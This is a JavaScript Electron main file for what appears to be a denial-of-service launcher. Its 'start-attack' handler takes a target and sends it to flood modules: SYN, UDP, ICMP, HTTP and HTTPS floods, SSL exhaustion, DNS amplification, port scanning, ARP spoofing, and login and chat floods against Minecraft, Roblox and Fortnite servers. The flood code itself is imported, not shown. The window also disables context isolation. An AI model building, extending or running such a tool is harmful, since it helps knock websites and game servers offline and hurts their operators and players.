const { app, BrowserWindow } = require('electron');
const path = require('path');

function createWindow() {
    const mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            preload: path.join(__dirname, 'preload.js'),
            nodeIntegration: true,
            contextIsolation: false,
        },
    });

    mainWindow.loadFile('index.html');
}

const { ipcMain } = require('electron');

app.whenReady().then(() => {
    createWindow();

    ipcMain.on('start-attack', (event, args) => {
        const { target, attackType, rateLimit } = args;
        startAttack(target, attackType, rateLimit);
    });

    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
});

app.on('window-all-closed', function () {
    if (process.platform !== 'darwin') app.quit();
});

const mineflayer = require('mineflayer');
const dgram = require('dgram');
const { exec } = require('child_process');
const httpFlood = require('./attacks/web/http_flood');
const httpsFlood = require('./attacks/web/https_flood');
const postFlood = require('./attacks/web/post_flood');
const sslExhaustion = require('./attacks/web/ssl_exhaustion');
const dnsAmplification = require('./attacks/web/dns_amplification');
const synFlood = require('./attacks/network/syn_flood');
const udpFlood = require('./attacks/network/udp_flood');
const icmpFlood = require('./attacks/network/icmp_flood');
const portScan = require('./attacks/network/port_scan');
const arpSpoofing = require('./attacks/network/arp_spoofing');
const minecraftLoginFlood = require('./attacks/games/minecraft_login_flood');
const minecraftChatFlood = require('./attacks/games/minecraft_chat_flood');
const robloxLoginFlood = require('./attacks/games/roblox_login_flood');
const robloxChatFlood = require('./attacks/games/roblox_chat_flood');
const fortniteLoginFlood = require('./attacks/games/fortnite_login_flood');
const fortniteChatFlood = require('./attacks/games/fortnite_chat_flood');

function startAttack(target, attackType, rateLimit) {
    const net = require('net');
    const http = require('http');
    const https = require('https');

    switch (attackType) {
        case 'syn':
            synFlood(target, rateLimit);
            break;
        case 'udp':
            udpFlood(target, rateLimit);
            break;
        case 'http':
            httpFlood(target, rateLimit);
            break;
        case 'https':
            httpsFlood(target, rateLimit);
            break;
        case 'post':
            postFlood(target, rateLimit);
            break;
        case 'ssl_exhaustion':
            sslExhaustion(target, rateLimit);
            break;
        case 'minecraft_login':
            minecraftLoginFlood(target, rateLimit);
            break;
        case 'minecraft_chat':
            minecraftChatFlood(target, rateLimit);
            break;
        case 'roblox_login':
            robloxLoginFlood(target, rateLimit);
            break;
        case 'roblox_chat':
            robloxChatFlood(target, rateLimit);
            break;
        case 'fortnite_login':
            fortniteLoginFlood(target, rateLimit);
            break;
        case 'fortnite_chat':
            fortniteChatFlood(target, rateLimit);
            break;
        case 'icmp':
            icmpFlood(target, rateLimit);
            break;
        case 'dns_amplification':
            dnsAmplification(target, rateLimit);
            break;
        case 'port_scan':
            portScan(target, rateLimit);
            break;
        case 'arp_spoofing':
            arpSpoofing(target, rateLimit);
            break;
        default:
            console.error('Invalid attack type');
    }
}
